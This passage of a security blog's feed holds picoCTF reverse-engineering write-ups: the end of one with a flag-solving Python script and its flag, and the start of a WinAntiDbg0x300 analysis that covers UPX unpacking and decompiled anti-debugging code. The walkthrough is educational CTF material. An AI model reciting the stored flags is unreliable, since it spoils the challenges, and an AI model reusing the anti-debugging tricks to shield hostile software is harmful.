class="built_in">ord</span>(char_map[<span class="string">&#x27;local_1c8&#x27;</span>][<span class="number">0</span>]) - <span class="built_in">ord</span>(char_map[<span class="string">&#x27;local_148&#x27;</span>][<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">        flag += char_map[<span class="string">&#x27;local_1c8&#x27;</span>]  <span class="comment"># This won&#x27;t execute</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Unconditionally append these characters</span></span><br><span class="line">    flag += char_map[<span class="string">&#x27;local_1e8&#x27;</span>]</span><br><span class="line">    flag += char_map[<span class="string">&#x27;local_188&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the value at index 0 of local_168 (&quot;a&quot;) is &#x27;G&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> char_map[<span class="string">&#x27;local_168&#x27;</span>][<span class="number">0</span>] == <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">        flag += char_map[<span class="string">&#x27;local_168&#x27;</span>]  <span class="comment"># This won&#x27;t execute</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Unconditionally append these characters</span></span><br><span class="line">    flag += char_map[<span class="string">&#x27;local_1a8&#x27;</span>]</span><br><span class="line">    flag += char_map[<span class="string">&#x27;local_88&#x27;</span>]</span><br><span class="line">    flag += char_map[<span class="string">&#x27;local_228&#x27;</span>]</span><br><span class="line">    flag += char_map[<span class="string">&#x27;local_128&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    flag += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(solve_picoctf())</span><br></pre></td></tr></table></figure><p>flag: <code>picoCTF&#123;wELF_d0N3_mate_1c496e73&#125;</code></p>]]></content>
    
    
    <summary type="html">Reversing decompiled C++ code to extract a flag by tracing string manipulation logic</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Python" scheme="https://rivers.sh/tags/Python/"/>
    
    <category term="Assembly" scheme="https://rivers.sh/tags/Assembly/"/>
    
    <category term="Ghidra" scheme="https://rivers.sh/tags/Ghidra/"/>
    
    <category term="C++" scheme="https://rivers.sh/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>WinAntiDbg0x300</title>
    <link href="https://rivers.sh/posts/winantidbg0x300/"/>
    <id>https://rivers.sh/posts/winantidbg0x300/</id>
    <published>2025-04-22T04:00:00.000Z</published>
    <updated>2025-07-17T07:36:11.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This challenge is a little bit invasive. It will try to fight your debugger. With that in mind, debug the binary and get the flag!<br>This challenge executable is a GUI application and it requires admin privileges. And remember, the flag might get corrupted if you mess up the process’s state.</p><p>Challenge can be downloaded <a href="https://artifacts.picoctf.net/c_titan/123/WinAntiDbg0x300.zip">here</a>. Unzip the archive with the password <code>picoctf</code></p><p>If you get “VCRUNTIME140D.dll” and “ucrtbased.dll” missing error, then that means the Universal C Runtime library and Visual C++ Debug library are not installed on your Windows machine.<br>The quickest way to fix this is:</p><ul><li>Download Visual Studio Community installer from <a href="https://visualstudio.microsoft.com/vs/community/">https://visualstudio.microsoft.com/vs/community/</a></li><li>After the installer starts, first select ‘Desktop development with C++’ and then, in the right side column, select ‘MSVC v143 - VS 2022 C++ x64&#x2F;x86 build tools’ and ‘Windows 11 SDK’ packages.</li></ul><p>This will take ~30 mins to install any missing DLLs.</p><p>This challenge is #3 of a 3 part series</p><p>prev <a href="https://rivers.sh/posts/winantidbg0x100">WinAntiDbg0x100</a><br>prev <a href="https://rivers.sh/posts/winantidbg0x100">WinAntiDbg0x200</a></p><hr><h2 id="Basic-forensics-info"><a href="#Basic-forensics-info" class="headerlink" title="Basic forensics &amp; info"></a>Basic forensics &amp; info</h2><p>Unlike the WinAntiDbg0x100 &amp; 200, this challenge doesn’t look normal when loaded into Ghidra. Additionally, we are given a <code>.pdb</code> (Program Database).<br>Even when loading this <code>.pdb</code>, I notice Ghidra isn’t able to load symbols. So, I decided to run the <code>file</code> command on the <code>.exe</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[marcial@arch ~/desktop/cyber/pico/winantidbg0x300]$ file WinAntiDbg0x300.exe</span><br><span class="line">WinAntiDbg0x300.exe: PE32 executable for MS Windows 6.00 (GUI), Intel i386, UPX compressed, 3 sections</span><br><span class="line">[marcial@arch ~/desktop/cyber/pico/winantidbg0x300]$</span><br></pre></td></tr></table></figure><p>Right away, I notice that the <code>.exe</code> is compressed via UPX. So, I head back to my Windows 10 virtual machine, install UPX, and run <code>upx -d WinAntiDbg0x300.exe</code> to decompress the file. Now, when loading this file into Ghidra alongside the <code>.pdb</code>, I notice symbols, which significantly makes it easier to reverse engineer. </p><p>Additionally, one of the hints states that: “if you’ve done everything correctly, the flag should pop-up on your screen after 5 esconds of launching the program.” DebugView can be downloaded <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/debugview">here</a></p><h2 id="Understanding-the-user-code"><a href="#Understanding-the-user-code" class="headerlink" title="Understanding the user-code"></a>Understanding the user-code</h2><h3 id="wWinMain"><a href="#wWinMain" class="headerlink" title="wWinMain"></a>wWinMain</h3><p>Looking at the symbol tree, I notice a folder under “Functions”, <code>wWinMain</code>, when inspecting the <code>wWinMain</code> function, we should see:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">wWinMain</span><span class="params">(HINSTANCE__ *param_1,HINSTANCE__ *param_2,<span class="type">wchar_t</span> *param_3,<span class="type">int</span> param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> bVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  undefined4 local_34 [<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> local_2c;</span><br><span class="line">  undefined4 local_18;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">wchar_t</span> **local_10;</span><br><span class="line">  undefined4 local_c;</span><br><span class="line">  <span class="type">int</span> local_8;</span><br><span class="line">  </span><br><span class="line">  PrintDbgBanner();</span><br><span class="line">  LoadStringW(param_1,<span class="number">0x67</span>,szTitle,<span class="number">200</span>);</span><br><span class="line">  LoadStringW(param_1,<span class="number">0x6d</span>,szWindowClass,<span class="number">200</span>);</span><br><span class="line">  iVar2 = ReadConfig();</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    MessageBoxW(appWindow,<span class="string">L&quot;[FATAL ERROR] Error opening the \&#x27;config.bin\&#x27; file. Challenge aborted.&quot;</span></span><br><span class="line">                ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">    Terminate(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ComputeHash(<span class="number">3</span>);</span><br><span class="line">  bVar1 = DetectDebuggerAtLaunch();</span><br><span class="line">  <span class="keyword">if</span> (bVar1) &#123;</span><br><span class="line">    MessageBoxW(appWindow,<span class="string">L&quot;Oops! Debugger Detected. Challenge Aborted.&quot;</span>,szTitle,<span class="number">0x40</span>);</span><br><span class="line">    Terminate(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ComputeHash(<span class="number">2</span>);</span><br><span class="line">  EnableDebugPrivilege();</span><br><span class="line">  ComputeHash(<span class="number">2</span>);</span><br><span class="line">  local_c = GetCommandLineW();</span><br><span class="line">  local_10 = (<span class="type">wchar_t</span> **)CommandLineToArgvW(local_c,&amp;local_14);</span><br><span class="line">  ManageChildProcess(local_14,local_10);</span><br><span class="line">  MyRegisterClass(param_1);</span><br><span class="line">  iVar2 = InitInstance(param_1,param_4);</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    local_2c = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    local_18 = LoadAcceleratorsW(param_1,<span class="number">0x6b</span>);</span><br><span class="line">    local_8 = CreateThread(<span class="number">0</span>,<span class="number">0</span>,ChallengeThreadFunction,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (local_8 == <span class="number">0</span>) &#123;</span><br><span class="line">      MessageBoxW(appWindow,<span class="string">L&quot;Error creating the thread. Aborting the challenge...&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">      local_2c = <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (iVar2 = GetMessageW(local_34,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>), iVar2 != <span class="number">0</span>) &#123;</span><br><span class="line">        iVar2 = TranslateAcceleratorW(local_34[<span class="number">0</span>],local_18,local_34);</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">          TranslateMessage(local_34);</span><br><span class="line">          DispatchMessageW(local_34);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(CONFIG_BUFFER);</span><br><span class="line">      CloseHandle(local_8);</span><br><span class="line">      CloseHandle(MUTEX);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_2c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I’ll give a quick rundown for now, and then further in the writeup I’ll analyze <code>ManageChildProcess</code>, <code>ComputeHash</code>, and <code>ChallengeThreadFunction</code> (most important one!) a bit more in-depth:</p><ol><li>Initial Setup:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PrintDbgBanner();</span><br><span class="line">LoadStringW(param_1,<span class="number">0x67</span>,szTitle,<span class="number">200</span>);</span><br><span class="line">LoadStringW(param_1,<span class="number">0x6d</span>,szWindowClass,<span class="number">200</span>);</span><br><span class="line">iVar2 = ReadConfig();</span><br><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  MessageBoxW(appWindow,<span class="string">L&quot;[FATAL ERROR] Error opening the \&#x27;config.bin\&#x27; file. Challenge aborted.&quot;</span></span><br><span class="line">              ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">  Terminate(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Displays a debug banner with <code>PrintDbgBanner()</code></li><li>Loads string resources for window title and class name </li><li>Reads configuration from “config.bin” file and exits if this fails</li></ul><ol start="2"><li>Anti-Debugging Mechanisms: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ComputeHash(3);</span><br><span class="line">bVar1 = DetectDebuggerAtLaunch();</span><br><span class="line">if (bVar1) &#123;</span><br><span class="line">  MessageBoxW(appWindow,L&quot;Oops! Debugger Detected. Challenge Aborted.&quot;,szTitle,0x40);</span><br><span class="line">  Terminate(0xff);</span><br><span class="line">&#125;</span><br><span class="line">ComputeHash(2);</span><br><span class="line">EnableDebugPrivilege();</span><br><span class="line">ComputeHash(2);</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>ComputeHash(3)</code> is called, which I’ll explain in a moment</li><li><code>DetectDebuggerAtLaunch()</code> checks if the debugger is present<ul><li>If one is detected, we get a message and it terminates with code 0xFF (255)</li></ul></li><li><code>EnableDebugPrivilege()</code> probably adjusts the process’s debugging permissions</li></ul><ol start="3"><li>Process Management: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">local_c = GetCommandLineW();</span><br><span class="line">local_10 = (<span class="type">wchar_t</span> **)CommandLineToArgvW(local_c,&amp;local_14);</span><br><span class="line">ManageChildProcess(local_14,local_10);</span><br><span class="line">MyRegisterClass(param_1);</span><br><span class="line">iVar2 = InitInstance(param_1,param_4);</span><br><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  local_2c = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Parses command line arguments</li><li>Calls <code>ManageChildProcess()</code></li><li>Creates a mutex handle (MUTEX global variable) for synchronization</li></ul><ol start="4"><li>Challenge Thread:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">local_18 = LoadAcceleratorsW(param_1,<span class="number">0x6b</span>);</span><br><span class="line">local_8 = CreateThread(<span class="number">0</span>,<span class="number">0</span>,ChallengeThreadFunction,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (local_8 == <span class="number">0</span>) &#123;</span><br><span class="line">  MessageBoxW(appWindow,<span class="string">L&quot;Error creating the thread. Aborting the challenge...&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">  local_2c = <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Creates a separate thread running <code>ChallengeThreadFunction()</code></li><li>If thread creation fails, the program terminates</li></ul><h3 id="ComputeHash"><a href="#ComputeHash" class="headerlink" title="ComputeHash"></a>ComputeHash</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">ComputeHash</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="type">int</span> iStack_10;</span><br><span class="line">  <span class="type">int</span> iStack_c;</span><br><span class="line">  </span><br><span class="line">  uVar1 = FLAG_SIZE;</span><br><span class="line">  <span class="keyword">for</span> (iStack_10 = <span class="number">0</span>; iStack_10 &lt; param_1; iStack_10 = iStack_10 + <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (iStack_c = <span class="number">0</span>; iStack_c &lt; (<span class="type">int</span>)uVar1; iStack_c = iStack_c + <span class="number">1</span>) &#123;</span><br><span class="line">      uVar2 = (iStack_c % <span class="number">0xff</span> &amp; <span class="number">0x55U</span>) + (iStack_c % <span class="number">0xff</span> &gt;&gt; <span class="number">1</span> &amp; <span class="number">0x55U</span>);</span><br><span class="line">      uVar2 = (uVar2 &amp; <span class="number">0x33</span>) + ((<span class="type">int</span>)uVar2 &gt;&gt; <span class="number">2</span> &amp; <span class="number">0x33U</span>);</span><br><span class="line">      HASH[iStack_c] =</span><br><span class="line">           (<span class="type">char</span>)((<span class="type">int</span>)((HASH[iStack_c] - <span class="number">0x61</span>) + (uVar2 &amp; <span class="number">0xf</span>) + ((<span class="type">int</span>)uVar2 &gt;&gt; <span class="number">4</span>)) % <span class="number">0x1a</span>) + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Function Signatures and Variables</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">ComputeHash</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="type">int</span> iStack_10;</span><br><span class="line">  <span class="type">int</span> iStack_</span><br></pre></td></tr></table></figure><ul><li>Takes a single parameter (param_1) that determines how many times the hashing operation is repeated</li><li>Modifies a global array called HASH that likely contains the flag or verification data</li><li>Uses a bit manipulation algorithm to transform each character</li></ul><ol start="2"><li>Algorithm</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uVar1 = FLAG_SIZE;</span><br><span class="line"><span class="keyword">for</span> (iStack_10 = <span class="number">0</span>; iStack_10 &lt; param_1; iStack_10 = iStack_10 + <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (iStack_c = <span class="number">0</span>; iStack_c &lt; (<span class="type">int</span>)uVar1; iStack_c = iStack_c + <span class="number">1</span>) &#123;</span><br><span class="line">    uVar2 = (iStack_c % <span class="number">0xff</span> &amp; <span class="number">0x55U</span>) + (iStack_c % <span class="number">0xff</span> &gt;&gt; <span class="number">1</span> &amp; <span class="number">0x55U</span>);</span><br><span class="line">    uVar2 = (uVar2 &amp; <span class="number">0x33</span>) + ((<span class="type">int</span>)uVar2 &gt;&gt; <span class="number">2</span> &amp; <span class="number">0x33U</span>);</span><br><span class="line">    HASH[iStack_c] =</span><br><span class="line">         (<span class="type">char</span>)((<span class="type">int</span>)((HASH[iStack_c] - <span class="number">0x61</span>) + (uVar2 &amp; <span class="number">0xf</span>) + ((<span class="type">int</span>)uVar2 &gt;&gt; <span class="number">4</span>)) % <span class="number">0x1a</span>) + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><ul><li>Outer loop runs param_1 times (called with values 2 and 3 in the main function)</li><li>Inner loop iterates through each character in the global HASH array up to FLAG_SIZE</li><li>For each character, it:<ul><li>Performs bit counting operations (population count algorithm)</li><li>Manipulates the character by subtracting ‘a’ (97), adding bit counts, then taking modulo 26</li><li>Adds ‘a’ back to keep the result in the lowercase alphabet range (a-z)</li></ul></li></ul><p>In short, this is basically a custom obfuscation technique to ensure that we can’t just immediately jump to the “decrypt flag” </p><h3 id="ManageChildProcess"><a href="#ManageChildProcess" class="headerlink" title="ManageChildProcess"></a>ManageChildProcess</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">ManageChildProcess</span><span class="params">(<span class="type">int</span> param_1,<span class="type">wchar_t</span> **param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">  undefined4 uVar3;</span><br><span class="line">  ulong uVar4;</span><br><span class="line">  </span><br><span class="line">  ComputeHash(<span class="number">1</span>);</span><br><span class="line">  MUTEX = (<span class="type">void</span> *)CreateMutexW(<span class="number">0</span>,<span class="number">0</span>,szTitle);</span><br><span class="line">  <span class="keyword">if</span> (MUTEX == (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    MessageBoxW(<span class="number">0</span>,<span class="string">L&quot;[FATAL ERROR] Failed to create the Mutex. Challenge aborted.&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">    Terminate(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = GetLastError();</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0xb7</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (param_1 != <span class="number">2</span>) &#123;</span><br><span class="line">      OutputDebugStringW(</span><br><span class="line">                        <span class="string">L&quot;[ERROR] Exactly two arguments expected by the Child process. Exiting...\n&quot;</span></span><br><span class="line">                        );</span><br><span class="line">      MessageBoxW(<span class="number">0</span>,<span class="string">L&quot;Check if the program is already running.&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">      CloseHandle(MUTEX);</span><br><span class="line">      Terminate(<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar2 = WCharToChar(param_2[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      OutputDebugStringW(<span class="string">L&quot;Error converting WChar to Char.\n&quot;</span>);</span><br><span class="line">      CloseHandle(MUTEX);</span><br><span class="line">      Terminate(<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar3 = atoi(pcVar2);</span><br><span class="line">    iVar1 = DebugActiveProcess(uVar3);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      uVar4 = atoi(pcVar2);</span><br><span class="line">      uVar4 = getParentProcessID(uVar4);</span><br><span class="line">      iVar1 = OpenProcess(<span class="number">1</span>,<span class="number">0</span>,uVar4);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        CloseHandle(MUTEX);</span><br><span class="line">        <span class="built_in">free</span>(pcVar2);</span><br><span class="line">        OutputDebugStringW(<span class="string">L&quot;Error opening a handle to debuggerPID.\n&quot;</span>);</span><br><span class="line">        Terminate(<span class="number">0xff</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      iVar1 = TerminateProcess(iVar1,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        OutputDebugStringW(<span class="string">L&quot;Failed to terminate the debugger process.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(pcVar2);</span><br><span class="line">        CloseHandle(MUTEX);</span><br><span class="line">        Terminate(<span class="number">0xfe</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        OutputDebugStringW(<span class="string">L&quot;Debugger process terminated successfully.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(pcVar2);</span><br><span class="line">        CloseHandle(MUTEX);</span><br><span class="line">        Terminate(<span class="number">0xfd</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      OutputDebugStringW(<span class="string">L&quot;No debugger was present. Exiting successfully.\n&quot;</span>);</span><br><span class="line">      uVar3 = atoi(pcVar2);</span><br><span class="line">      DebugActiveProcessStop(uVar3);</span><br><span class="line">      CloseHandle(MUTEX);</span><br><span class="line">      <span class="built_in">free</span>(pcVar2);</span><br><span class="line">      Terminate(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Terminate(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ComputeHash(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Initialization <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ComputeHash(<span class="number">1</span>);</span><br><span class="line">MUTEX = (<span class="type">void</span> *)CreateMutexW(<span class="number">0</span>,<span class="number">0</span>,szTitle);</span><br><span class="line"><span class="keyword">if</span> (MUTEX == (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">  MessageBoxW(<span class="number">0</span>,<span class="string">L&quot;[FATAL ERROR] Failed to create the Mutex. Challenge aborted.&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">  Terminate(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Computes hash to verify integrity </li><li>Creates a mutex with <code>szTitle</code> for synchronization between processes </li><li>Exits if mutex creation fails with error code 0xFF (255)</li></ul><ol start="2"><li>Process Verification <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iVar1 = GetLastError();</span><br><span class="line"><span class="keyword">if</span> (iVar1 == <span class="number">0xb7</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (param_1 != <span class="number">2</span>) &#123;</span><br><span class="line">    OutputDebugStringW(</span><br><span class="line">                      <span class="string">L&quot;[ERROR] Exactly two arguments expected by the Child process. Exiting...\n&quot;</span></span><br><span class="line">                      );</span><br><span class="line">    MessageBoxW(<span class="number">0</span>,<span class="string">L&quot;Check if the program is already running.&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">    CloseHandle(MUTEX);</span><br><span class="line">    Terminate(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Checks if another instance is already running by examining <code>GetLastError()</code> for ERROR_ALREADY_EXISTS (0xb7)</li><li>Validates the number of command-line arguments (expects exactly 2 for child process)</li></ul><ol start="3"><li>Anti-Debugging Check<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 